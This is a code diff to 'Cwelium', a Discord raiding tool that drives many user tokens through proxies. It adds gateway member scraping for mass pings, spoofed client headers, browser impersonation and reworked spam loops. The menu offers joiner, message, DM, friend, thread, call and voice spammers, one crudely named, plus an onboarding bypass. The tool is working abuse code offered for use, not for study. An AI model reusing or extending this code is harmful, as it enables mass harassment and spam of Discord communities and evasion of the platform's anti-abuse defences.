@@ -9,25 +9,68 @@
 # https://github.com/Tips-Discord/Cwelium/blob/main/LICENSE
 
 #from concurrent.futures import ThreadPoolExecutor
+import getpass
+import sys
 from colorama import Fore, init; init(autoreset=True)
 from colorist import ColorHex as h
 from datetime import datetime
 import base64
 import ctypes
-import json
 import os
 import random
 import re
 import requests
-import secrets
+import zlib
+import socket
 import string
 import threading
 import time
-import tls_client
+import curl_cffi
 import uuid
 import websocket
+import orjson
 
-session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17613-65037-65281,4588-29-23-24,0", h2_settings={"HEADER_TABLE_SIZE": 65536, "ENABLE_PUSH": 0, "INITIAL_WINDOW_SIZE": 6291456, "MAX_HEADER_LIST_SIZE": 262144}, h2_settings_order=["HEADER_TABLE_SIZE", "ENABLE_PUSH", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"], supported_versions=["TLS_1_3", "TLS_1_2"], key_share_curves=["GREASE", "X25519MLKEM768", "X25519", "secp256r1", "secp384r1"], pseudo_header_order=[":method", ":authority", ":scheme", ":path"], connection_flow=15663105, priority_frames=[])
+class JsonWrapper:
+    @staticmethod
+    def loads(data, **kwargs):
+        return orjson.loads(data)
+
+    @staticmethod
+    def load(fp, **kwargs):
+        return orjson.loads(fp.read())
+
+    @staticmethod
+    def dumps(data, indent=None, separators=None, sort_keys=False, **kwargs):
+        option = 0
+        
+        if indent:
+            option |= orjson.OPT_INDENT_2
+            
+        if sort_keys:
+            option |= orjson.OPT_SORT_KEYS
+
+        option |= orjson.OPT_NON_STR_KEYS 
+
+        return orjson.dumps(data, option=option).decode()
+
+    @staticmethod
+    def dump(data, fp, indent=None, separators=None, sort_keys=False, **kwargs):
+        option = 0
+        if indent:
+            option |= orjson.OPT_INDENT_2
+        if sort_keys:
+            option |= orjson.OPT_SORT_KEYS
+        
+        payload = orjson.dumps(data, option=option)
+        
+        try:
+            fp.write(payload)
+        except TypeError:
+            fp.write(payload.decode())
+
+json = JsonWrapper()
+
+session = curl_cffi.Session(impersonate="chrome136",)
 
 def get_random_str(length):
     return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
@@ -120,40 +163,88 @@ with open("config.json") as f:
     
 proxy = Config["Proxies"]
 color = Config["Theme"]
+global_raider = None
 
 class Render:
     def __init__(self):
         self.size = os.get_terminal_size().columns
         self.print_lock = threading.Lock()
-        if not color:
-            self.background = C["light_blue"]
-        else:
-            self.background = C[color]
+        self.theme_name = color if color in C else "light_blue"
+        self.theme_hex = C[self.theme_name].hex
+        self.background = C[self.theme_name]
+        self.username = getpass.getuser()
 
     def title(self, title):
-        ctypes.windll.kernel32.SetConsoleTitleW(title)
+        try:
+            if os.name == 'nt':
+                ctypes.windll.kernel32.SetConsoleTitleW(title)
+            else:
+                sys.stdout.write(f"\x1b]2;{title}\x07")
+                sys.stdout.flush()
+        except Exception:
+            pass
 
     def clear(self):
-        os.system("cls")
+        sys.stdout.write("\033[2J\033[H\033[3J")
+        sys.stdout.flush()
+
+    def _get_shade(self, x, y, width, height):
+        def hex_to_rgb(h_code):
+            h_code = h_code.lstrip('#')
+            return tuple(int(h_code[i:i+2], 16) for i in (0, 2, 4))
         
+        start_rgb = hex_to_rgb(self.theme_hex)
+        end_rgb = (int(start_rgb[0] * 0.35), int(start_rgb[1] * 0.35), int(start_rgb[2] * 0.35))
+        
+        w_idx, h_idx = max(1, width - 1), max(1, height - 1)
+        denom = (w_idx**2 + h_idx**2)
+        factor = (x * w_idx + y * h_idx) / denom
+        factor = max(0, min(1, factor)) 
+        
+        r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * factor)
+        g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * factor)
+        b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * factor)
+        
+        return h(f'#{r:02x}{g:02x}{b:02x}')
+
+    def center_colored(self, text, visible_len):
+        try:
+           terminal_width = os.get_terminal_size().columns
+        except OSError:
+           terminal_width = self.size
+
+        padding = max(0, (terminal_width - visible_len) // 2)
+        return (" " * padding) + text
+
     def render_ascii(self):
         self.clear()
-        self.title(f"Cwelium | Connected as {os.getlogin()} | made by Tips-Discord")
-        edges = ["╗", "║", "╚", "╝", "═", "╔"]
-        ascii = f"""
-{' ██████╗██╗    ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗'.center(self.size)}
-{'██╔════╝██║    ██║██╔════╝██║     ██║██║   ██║████╗ ████║'.center(self.size)}
-{'██║     ██║ █╗ ██║█████╗  ██║     ██║██║   ██║██╔████╔██║'.center(self.size)}
-{'██║     ██║███╗██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║'.center(self.size)}
-{'╚██████╗╚███╔███╔╝███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║'.center(self.size)}
-{' ╚═════╝ ╚══╝╚══╝ ╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝'.center(self.size)}
-{''.center(self.size)}
-"""
+        self.title(f"Cwelium | Connected as {self.username} | made by Tips-Discord")
         
-        for line in ascii.splitlines():
-            for edge in edges:
-                line = line.replace(edge, f"{self.background}{edge}{C['white']}")
-            print(line)
+        edges = {"╗", "║", "╚", "╝", "═", "╔"}
+        logo = [
+            " ██████╗██╗    ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗",
+            "██╔════╝██║    ██║██╔════╝██║     ██║██║   ██║████╗ ████║",
+            "██║     ██║ █╗ ██║█████╗  ██║     ██║██║   ██║██╔████╔██║",
+            "██║     ██║███╗██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║",
+            "╚██████╗╚███╔███╔╝███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║",
+            " ╚═════╝ ╚══╝╚══╝ ╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝"
+        ]
+        
+        height = len(logo)
+        width = max(len(line) for line in logo)
+
+        print("\n")
+        for y, line in enumerate(logo):
+            colored_line = ""
+            visible_len = 0
+            for x, char in enumerate(line):
+                if char in edges:
+                    colored_line += f"{self._get_shade(x, y, width, height)}{char}{C['white']}"
+                else:
+                    colored_line += char
+                visible_len += 1
+            print(self.center_colored(colored_line, visible_len))
+        print("\n")
 
     def raider_options(self):
         with open("data/proxies.txt") as f:
@@ -163,22 +254,39 @@ class Render:
             global tokens
             tokens = f.read().splitlines()
 
-        edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
-        title = f"""{Fore.RESET}{' ' * max(0, (self.size - len(f'Loaded ‹{len(tokens)}› tokens | Loaded ‹{len(proxies)}› proxies')) // 2)}Loaded ‹{self.background}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{self.background}{len(proxies)}{Fore.RESET}› proxies
+        menu_edges = {"─", "╭", "│", "╰", "╯", "╮", "»", "«"}
+        menu = [
+            "╭─────────────────────────────────────────────────────────────────────────────────────────────╮",
+            "│ «01» Joiner            «07» Token Formatter    «13» Onliner           «19» Call Spammer     │",
+            "│ «02» Leaver            «08» Button Click       «14» Voice Raper       «20» Bio Change       │",
+            "│ «03» Spammer           «09» Accept Rules       «15» Change Nick       «21» Voice Joiner     │",
+            "│ «04» Token Checker     «10» Guild Check        «16» Thread Spammer    «22» Onboard Bypass   │",
+            "│ «05» Emoji Reaction    «11» Friend Spam        «17» Typer             «23» Dm Spammer       │",
+            "│ «06» ???               «12» ???                «18» ???               «24» Exit             │",
+            "╰─────────────────────────────────────────────────────────────────────────────────────────────╯",
+            "«~» Credits"
+        ]
 
-{'╭─────────────────────────────────────────────────────────────────────────────────────────────╮'.center(self.size)}
-{'│ «01» Joiner            «07» Token Formatter    «13» Onliner           «19» Call Spammer     │'.center(self.size)}
-{'│ «02» Leaver            «08» Button Click       «14» Voice Raper       «20» Bio Change       │'.center(self.size)}
-{'│ «03» Spammer           «09» Accept Rules       «15» Change Nick       «21» Voice Joiner     │'.center(self.size)}
-{'│ «04» Token Checker     «10» Guild Check        «16» Thread Spammer    «22» Onboard Bypass   │'.center(self.size)}
-{'│ «05» Emoji Reaction    «11» Friend Spam        «17» Typer             «23» Dm Spammer       │'.center(self.size)}
-{'│ «06» ???               «12» ???                «18» ???               «24» Exit             │'.center(self.size)}
-{'╰─────────────────────────────────────────────────────────────────────────────────────────────╯'.center(self.size)}
-{'«~» Credits'.center(self.size)}
-"""
-        for edge in edges:
-            title = title.replace(edge, f"{self.background}{edge}{C['white']}")
-        print(title)
+        stats_text = f"Loaded ‹{len(tokens)}› tokens | Loaded ‹{len(proxies)}› proxies"
+        stats_colored = f"Loaded ‹{self.background}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{self.background}{len(proxies)}{Fore.RESET}› proxies"
+        print(self.center_colored(stats_colored, len(stats_text)) + "\n")
+
+        h_menu = len(menu)
+        w_menu = len(menu[0])
+
+        for y, line in enumerate(menu):
+            colored_line = ""
+            visible_len = 0
+            for x, char in enumerate(line):
+                if char in menu_edges:
+                    shade = self._get_shade(x, y, w_menu, h_menu)
+                    colored_line += f"{shade}{char}{C['white']}"
+                else:
+                    colored_line += char
+                visible_len += 1
+            print(self.center_colored(colored_line, visible_len))
+        
+        print("\n")
 
     def run(self):
         options = [self.render_ascii(), self.raider_options()]
@@ -193,67 +301,96 @@ class Render:
         if log:
             response += f" ({C['gray']}{log}{C['white']})"
 
+        response += f"{Fore.RESET}"
+
         with self.print_lock:
             print(response)
 
     def prompt(self, text, ask=None):
-        prompted = f"[{C[color]}{text}{C['white']}]"
+        prompted = f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}] {C[color]}➜{Fore.RESET}  {Fore.WHITE}{text}{Fore.RESET}"
+
         if ask:
-            prompted += f" {C['gray']}(y/n){C['white']}: "
+            prompted += f" {Fore.LIGHTBLACK_EX}({C['green']}y{Fore.RESET}{Fore.LIGHTBLACK_EX}/{C['red']}n{Fore.RESET}{Fore.LIGHTBLACK_EX}){Fore.LIGHTBLACK_EX}:{Fore.RESET} "
         else:
-            prompted += ": "
+            prompted += f"{C[color]}:{Fore.RESET} "
             
         return prompted
 
 console = Render()
+    
+class AutoFetchHeaders:
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9219 Chrome/138.0.7204.251 Electron/37.6.0 Safari/537.36"
+    client_build_number = 482285
+    native_build_number = 73385
+    client_version = "1.0.9219"
+    browser_version = "37.6.0"
+    _fetched = False
+    
+    @staticmethod
+    def fetch():
+        try:
+            if AutoFetchHeaders._fetched:
+                return
 
-# Big Thanks to Aniell4 for the scraper
+            console.log("Scraping", C["light_blue"], False, "Fetching latest Discord headers...")
+            
+            response = requests.get("https://api.sockets.lol/discord/build", timeout=5)
+            
+            if response.status_code == 200:
+                data = response.json()
+                
+                if "clients" in data and "Discord" in data["clients"]:
+                    discord_data = data["clients"]["Discord"]["decoded"]
+                    
+                    if discord_data.get("release_channel") == "stable":
+                        AutoFetchHeaders.user_agent = discord_data["browser_user_agent"]
+                        AutoFetchHeaders.client_version = discord_data["client_version"]
+                        AutoFetchHeaders.browser_version = discord_data["browser_version"]
+                        AutoFetchHeaders.native_build_number = discord_data["native_build_number"]
+                        AutoFetchHeaders.client_build_number = discord_data["client_build_number"]
+
+                        console.log("Success", C["green"], False, f"Updated: Build {AutoFetchHeaders.client_build_number} | v{AutoFetchHeaders.client_version}")
+                        AutoFetchHeaders._fetched = True
+                    else:
+                        console.log("Failed", C["red"], False, "Fetched data was not Stable channel.")
+                else:
+                    console.log("Failed", C["red"], False, "Stable 'Discord' client data not found in API.")
+            else:
+                console.log("Failed", C["red"], False, f"API returned status {response.status_code}")
+        except Exception as e:
+            console.log("Failed", C["red"], "AutoFetch", e)
+
 class Utils:
     @staticmethod
-    def range_corrector(ranges):
-        if [0, 99] not in ranges:
-            ranges.insert(0, [0, 99])
-        return ranges
-
-    @staticmethod
-    def get_ranges(index, multiplier, member_count):
+    def get_ranges(index, multiplier):
         initial_num = index * multiplier
-        ranges = [[initial_num, initial_num + 99]]
-        if member_count > initial_num + 99:
-            ranges.append([initial_num + 100, initial_num + 199])
-        return Utils.range_corrector(ranges)
+        return [[initial_num, initial_num + 99], [initial_num + 100, initial_num + 199]]
 
     @staticmethod
-    def parse_member_list_update(response):
-        data = response["d"]
-        member_data = {
-            "online_count": data["online_count"],
-            "member_count": data["member_count"],
-            "id": data["id"],
-            "guild_id": data["guild_id"],
-            "hoisted_roles": data["groups"],
-            "types": [op["op"] for op in data["ops"]],
-            "locations": [],
-            "updates": [],
+    def parse_member_list_update(data):
+        d = data["d"]
+        return {
+            "online_count": d["online_count"],
+            "member_count": d["member_count"],
+            "guild_id": d["guild_id"],
+            "ops": d["ops"]
         }
-
-        for chunk in data["ops"]:
-            op_type = chunk["op"]
-            if op_type in {"SYNC", "INVALIDATE"}:
-                member_data["locations"].append(chunk["range"])
-                member_data["updates"].append(chunk["items"] if op_type == "SYNC" else [])
-            elif op_type in {"INSERT", "UPDATE", "DELETE"}:
-                member_data["locations"].append(chunk["index"])
-                member_data["updates"].append(chunk["item"] if op_type != "DELETE" else [])
-
-        return member_data
 
 class DiscordSocket(websocket.WebSocketApp):
     def __init__(self, token, guild_id, channel_id):
+        self.start = time.time()
         self.token = token
         self.guild_id = guild_id
         self.channel_id = channel_id
-        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", "1273658880039190581", "1308012310396407828", "1326906424873193586", "1334512667456442411", "1349869929809186846"}
+        
+        self.blacklisted_ids = {
+            "1100342265303547924", "1190052987477958806", "833007032000446505", 
+            "1273658880039190581", "1308012310396407828", "1326906424873193586", 
+            "1334512667456442411", "1349869929809186846", "1171574570092871700",
+        }
+
+        self.buffer = bytearray()
+        self.inflator = zlib.decompressobj()
 
         headers = {
             "Accept-Encoding": "gzip, deflate, br",
@@ -261,61 +398,67 @@ class DiscordSocket(websocket.WebSocketApp):
             "Cache-Control": "no-cache",
             "Pragma": "no-cache",
             "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+            "User-Agent": AutoFetchHeaders.user_agent,
         }
 
         super().__init__(
-            "wss://gateway.discord.gg/?encoding=json&v=9",
+            "wss://gateway.discord.gg/?encoding=json&v=9&compress=zlib-stream",
             header=headers,
             on_open=self.on_open,
             on_message=self.on_message,
             on_close=self.on_close,
+            on_error=self.on_error
         )
 
         self.end_scraping = False
-        self.guilds = {}
+        self.guild_member_count = 0
         self.members = {}
-        self.ranges = [[0, 0]]
+        self.ranges = [[0, 99]]
         self.last_range = 0
         self.packets_recv = 0
 
     def run(self):
-        self.run_forever()
+        self.run_forever(
+            sockopt=((socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),)
+        )
         return self.members
 
     def scrape_users(self):
-        if not self.end_scraping:
-            self.send(json.dumps({
-                "op": 14,
-                "d": {
-                    "guild_id": self.guild_id,
-                    "typing": True,
-                    "activities": True,
-                    "threads": True,
-                    "channels": {self.channel_id: self.ranges}
-                }
-            }))
+        if self.end_scraping:
+            return
+            
+        payload = {
+            "op": 14,
+            "d": {
+                "guild_id": self.guild_id,
+                "typing": False,
+                "activities": False,
+                "threads": False,
+                "channels": {self.channel_id: self.ranges}
+            }
+        }
+        self.send(json.dumps(payload))
 
     def on_open(self, ws):
         self.send(json.dumps({
             "op": 2,
             "d": {
                 "token": self.token,
-                "capabilities": 125,
+                "capabilities": 1734653,
                 "properties": {
                     "os": "Windows",
                     "browser": "Chrome",
                     "device": "",
-                    "system_locale": "it-IT",
-                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
-                    "browser_version": "138.0.0.0",
+                    "system_locale": "en-US",
+                    "browser_user_agent": AutoFetchHeaders.user_agent,
+                    "browser_version": AutoFetchHeaders.browser_version,
                     "os_version": "10",
                     "referrer": "",
                     "referring_domain": "",
                     "referrer_current": "",
                     "referring_domain_current": "",
                     "release_channel": "stable",
-                    "client_build_number": 419434,
+                    "client_build_number": AutoFetchHeaders.client_build_number,
                     "client_event_source": None
                 },
                 "presence": {
@@ -337,104 +480,123 @@ class DiscordSocket(websocket.WebSocketApp):
 
     def heartbeat_thread(self, interval):
         while not self.end_scraping:
-            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
-            time.sleep(interval)
+            try:
+                self.send(json.dumps({"op": 1, "d": self.packets_recv}))
+                time.sleep(interval)
+            except Exception:
+                break
 
     def on_message(self, ws, message):
-        decoded = json.loads(message)
-        if not decoded:
+        if isinstance(message, bytes):
+            self.buffer.extend(message)
+            if len(message) < 4 or message[-4:] != b'\x00\x00\xff\xff':
+                return
+            
+            try:
+                message = self.inflator.decompress(self.buffer)
+                message = message.decode("utf-8")
+                self.buffer = bytearray()
+            except Exception:
+                return 
+
+        try:
+            decoded = json.loads(message)
+        except:
             return
 
-        self.packets_recv += decoded["op"] != 11
+        if decoded is None: 
+            return
 
-        if decoded["op"] == 10:
-            threading.Thread(
-                target=self.heartbeat_thread,
-                args=(decoded["d"]["heartbeat_interval"] / 1000,),
-                daemon=True,
-            ).start()
+        op = decoded.get("op")
+        t = decoded.get("t")
+        
+        self.packets_recv += 1 if op != 11 else 0
 
-        if decoded["t"] == "READY":
-            self.guilds.update({
-                guild["id"]: {"member_count": guild["member_count"]}
-                for guild in decoded["d"]["guilds"]
-            })
+        if op == 10:
+            interval = decoded["d"]["heartbeat_interval"] / 1000
+            threading.Thread(target=self.heartbeat_thread, args=(interval,), daemon=True).start()
 
-            total_members = self.guilds[self.guild_id]["member_count"]
+        elif t == "READY":
+            for guild in decoded["d"]["guilds"]:
+                if guild["id"] == self.guild_id:
+                    self.guild_member_count = guild.get("member_count", 0)
+                    break
+            
+            console.log("Info", C["yellow"], False, f"Target: {self.guild_member_count} members")
 
-            console.log("Info", C["yellow"], False, f"Guild has {total_members} members → ETA ~{round(total_members / 150, 1)}s")
-
-        if decoded["t"] == "READY_SUPPLEMENTAL":
-            self.ranges = Utils.get_ranges(0, 100, self.guilds[self.guild_id]["member_count"])
+        elif t == "READY_SUPPLEMENTAL":
+            self.ranges = Utils.get_ranges(0, 100)
             self.scrape_users()
 
-        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
+        elif t == "GUILD_MEMBER_LIST_UPDATE":
             parsed = Utils.parse_member_list_update(decoded)
+            
             if parsed["guild_id"] == self.guild_id:
-                self.process_updates(parsed)
+                should_continue = False
+                
+                for op_chunk in parsed["ops"]:
+                    op_type = op_chunk["op"]
+                    
+                    if op_type in ("SYNC", "UPDATE"):
+                        if op_type == "SYNC":
+                            items = op_chunk.get("items")
+                        else:
+                            items = [op_chunk.get("item")]
 
-    def process_updates(self, parsed):
-        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
-            for i, update_type in enumerate(parsed["types"]):
-                if update_type in {"SYNC", "UPDATE"}:
-                    if not parsed["updates"][i]:
+                        if not items: 
+                            continue
+
+                        for item in items:
+                            member = item.get("member")
+                            if not member: 
+                                continue
+                            
+                            user = member.get("user")
+                            if not user: 
+                                continue
+                            
+                            uid = user.get("id")
+                            if uid and uid not in self.blacklisted_ids and not user.get("bot"):
+                                self.members[uid] = {
+                                    "tag": f"{user.get('username')}#{user.get('discriminator', '0')}",
+                                    "id": uid
+                                }
+                        
+                        should_continue = True
+
+                    elif op_type == "INVALIDATE":
+                        self.ranges = Utils.get_ranges(self.last_range, 100)
+                        self.scrape_users()
+                        
+                if len(self.members) >= self.guild_member_count or not should_continue:
+                    if (self.last_range * 100) >= self.guild_member_count:
                         self.end_scraping = True
-                        break
-                    self.process_members(parsed["updates"][i])
+                        self.close()
+                        return
 
-                self.last_range += 1
-                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds[self.guild_id]["member_count"])
+                self.last_range += 2
+                self.ranges = Utils.get_ranges(self.last_range, 100)
                 self.scrape_users()
 
-        if self.end_scraping:
-            self.close()
-
-    def process_members(self, updates):
-        for item in updates:
-            member = item.get("member")
-            if member:
-                user = member.get("user", {})
-                user_id = user.get("id")
-                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
-                    self.members[user_id] = {
-                        "tag": f"{user.get('username')}#{user.get('discriminator')}",
-                        "id": user_id,
-                    }
+    def on_error(self, ws, error):
+        if not self.end_scraping:
+            console.log("Error", C["red"], False, f"Socket Error: {error}")
+            pass
 
     def on_close(self, ws, close_code, close_msg):
-        console.log("Success", C["green"], False, f"Scraped {len(self.members)} members")
+        console.log("Success", C["green"], False, f"Scraped {len(self.members)} members in {time.time() - self.start:.2f}s")
 
 def scrape(token, guild_id, channel_id):
     sb = DiscordSocket(token, guild_id, channel_id)
     return sb.run()
-    
+
 class Raider:
     def __init__(self):
-        self.build_number = 429117
-        self.cf_token = self.get_cloudflare_cookies()
+        AutoFetchHeaders.fetch()
         self.cookies, self.fingerprint = self.get_discord_cookies()
         self.ws = websocket.WebSocket()
-
-    def get_cloudflare_cookies(self):
-        try:
-            response = requests.get(
-                "https://discord.com/channels/@me"
-            )
-
-            challange = re.sub(r".*r:'([^']+)'.*", r"\1", response.text, flags=re.DOTALL)
-            build_number = re.sub(r'.*"BUILD_NUMBER":"(\d+)".*', r'\1', response.text, flags=re.DOTALL)
-            if build_number is not None:
-                self.build_number = build_number
-
-            cf_token = requests.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/jsd/r/{random.random():.16f}:{str(int(time.time()))}:{secrets.token_urlsafe(32)}/{challange}')
-            match cf_token.status_code:
-                case 200:
-                    cookie = list(cf_token.cookies)[0]
-                    return f"{cookie.name}={cookie.value}"
-                case _:
-                    console.log("ERROR", C["red"], "Failed to get cf_clearance")
-        except Exception as e:
-            console.log("ERROR", C["red"], "get_cf", e)
+        self.cached_members = {}
+        self.header_cache = {}
 
     def get_discord_cookies(self):
         try:
@@ -445,7 +607,7 @@ class Raider:
                 case 200:
                     return "; ".join(
                         [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
-                    ) + f"; {self.cf_token}; locale=en-US", response.json()["fingerprint"]
+                    ) + f"; locale=en-US", response.json()["fingerprint"]
                 case _:
                     console.log("ERROR", C["red"], "Failed to get cookies using Static")
                     return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
@@ -456,16 +618,18 @@ class Raider:
         try:
             payload = {
                 "os": "Windows",
-                "browser": "Chrome",
+                "browser": "Discord Client",
                 "release_channel": "stable",
-                "os_version": "10",
-                "system_locale": "pl",
-                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
-                "browser_version": "139.0.0.0",
-                "client_build_number": int(self.build_number),
-                "client_launch_id": str(uuid.uuid4()),
-                "client_heartbeat_session_id": str(uuid.uuid4()),
-                "launch_signature": str(uuid.uuid4()),
+                "client_version": AutoFetchHeaders.client_version,
+                "os_version": "10.0.26100",
+                "system_locale": "en-US",
+                "browser_user_agent": AutoFetchHeaders.user_agent,
+                "browser_version": AutoFetchHeaders.browser_version,
+                "client_build_number": AutoFetchHeaders.client_build_number,
+                "native_build_number": AutoFetchHeaders.native_build_number,
+                "client_launch_id": str(uuid.uuid4()), # eg. e6ee9ac7-cbc9-4e22-850f-d78055e4f943
+                "client_heartbeat_session_id": str(uuid.uuid4()), # eg. 481a6710-a457-4085-8660-c769355a850b
+                "launch_signature": str(uuid.uuid4()), # eg. 860f4e4c-95a1-4355-8b5e-53bee60636b8
                 "client_event_source": None,
             }
             properties = base64.b64encode(json.dumps(payload).encode()).decode()
@@ -474,19 +638,25 @@ class Raider:
             console.log("ERROR", C["red"], "get_super_properties", e)
 
     def headers(self, token):
-        return {
+        if token in self.header_cache:
+            return self.header_cache[token]
+
+        headers = {
             "authority": "discord.com",
             "accept": "*/*",
             "accept-language": "en",
             "authorization": token,
             "cookie": self.cookies,
             "content-type": "application/json",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
+            "user-agent": AutoFetchHeaders.user_agent,
             "x-discord-locale": "en-US",
             "x-debug-options": "bugReporterEnabled",
             "x-fingerprint": self.fingerprint,
             "x-super-properties": self.super_properties(),
         }
+
+        self.header_cache[token] = headers
+        return headers
     
     def nonce(self):
         return int(time.time() * 1000) - 1420070400000 << 22
@@ -516,6 +686,12 @@ class Raider:
                         input()
                         Menu().main_menu()
                         return
+            
+            if not invite_info:
+                console.log("Failed", C["red"], "Could not retrieve invite info")
+                input()
+                Menu().main_menu()
+                return
 
             guild_name = invite_info["guild"]["name"]
             guild_id = invite_info["guild"]["id"]
@@ -597,7 +773,7 @@ class Raider:
                 case 204:
                     console.log("Left", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
                 case 429:
-                    console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"discord.gg/{invite}")
+                    console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                 case _:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
         except Exception as e:
@@ -605,24 +781,28 @@ class Raider:
 
     def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None, random_str=None, delay=None):
         try:
-            while True:
-                if massping:
-                    msg = self.get_random_members(guild, int(pings))
+            if massping and guild:
+                self.get_random_members(guild, 1) 
 
-                    payload = {
-                        "content": f"{message} {msg}"
-                    }
-                else:
-                    payload = {
-                        "content": f"{message}"
-                    }
-                
+            url = f"https://discord.com/api/v9/channels/{channel}/messages"
+            headers = self.headers(token) 
+
+            while True:
+                content = message
+                if massping:
+                    content += f" {self.get_random_members(guild, pings)}"
                 if random_str:
-                    payload["content"] += f" > {get_random_str(15)}"
+                    content += f" | {get_random_str(10)}"
+
+                payload = {
+                    "content": content,
+                    "nonce": str(self.nonce()),
+                    "tts": False
+                }
 
                 response = session.post(
-                    f"https://discord.com/api/v9/channels/{channel}/messages",
-                    headers=self.headers(token),
+                    url,
+                    headers=headers,
                     json=payload
                 )
 
@@ -632,7 +812,7 @@ class Raider:
                         if delay:
                             time.sleep(delay)
                     case 429:
-                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
+                        retry_after = response.json()["retry_after"]
                         console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                         time.sleep(float(retry_after))
                     case _:
@@ -668,16 +848,24 @@ class Raider:
             console.log("Failed", C["red"], False, e)
 
     def get_random_members(self, guild_id, count):
-        try:
-            with open(f"scraped/{guild_id}.json") as f:
-                members = json.load(f)
+        if guild_id not in self.cached_members:
+            try:
+                file_path = f"scraped/{guild_id}.json"
+                if os.path.exists(file_path):
+                    with open(file_path, "r") as f:
+                        self.cached_members[guild_id] = json.loads(f.read())
+                else:
+                    return ""
+            except Exception as e:
+                console.log("Error", C["red"], f"Cache Load Failed: {e}")
+                return ""
 
-            message = ""
-            for _ in range(int(count)):
-                message += f"<@!{random.choice(members)}>"
-            return message
-        except Exception as e:
-            console.log("Failed", C["red"], "Failed to get Random Members", e)
+        members = self.cached_members[guild_id]
+        if not members: 
+            return ""
+        
+        selected = random.sample(members, min(count, len(members)))
+        return " ".join(f"<@!{uid}>" for uid in selected)
 
     def voice_spammer(self, token, ws, guild_id, channel_id, close=None):
         try:
@@ -837,7 +1025,7 @@ class Raider:
                     case 204:
                         console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Played {sound['name']}")
                     case 429:
-                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
+                        retry_after = response.json()["retry_after"]
                         console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                         time.sleep(float(retry_after))
                     case _:
@@ -901,7 +1089,7 @@ class Raider:
             while True:
                 payload = {
                     "content": message,
-                    "nonce": self.nonce(),
+                    "nonce": str(self.nonce()),
                 }
 
                 response = session.post(
@@ -1007,7 +1195,7 @@ class Raider:
                     case 201:
                         console.log("Created", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                     case 429:
-                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
+                        retry_after = response.json()["retry_after"]
                         if int(retry_after) > 10:
